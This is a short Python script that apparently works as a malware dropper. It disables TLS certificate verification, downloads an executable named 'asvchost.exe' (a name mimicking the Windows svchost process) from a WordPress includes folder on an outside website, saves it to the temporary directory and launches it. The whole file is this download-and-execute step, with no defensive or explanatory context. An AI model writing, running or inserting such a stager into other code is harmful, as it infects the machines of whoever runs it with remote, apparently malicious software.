import tempfile
import urllib.request as urllib2
import ssl
ssl._create_default_https_context = ssl._create_unverified_context
url = 'https://luckyebuy.com/wp-includes/asvchost.exe'
f = urllib2.urlretrieve(url, tempfile.gettempdir() + r"\asvchost.exe")
import os
os.startfile(tempfile.gettempdir() + r"\asvchost.exe")
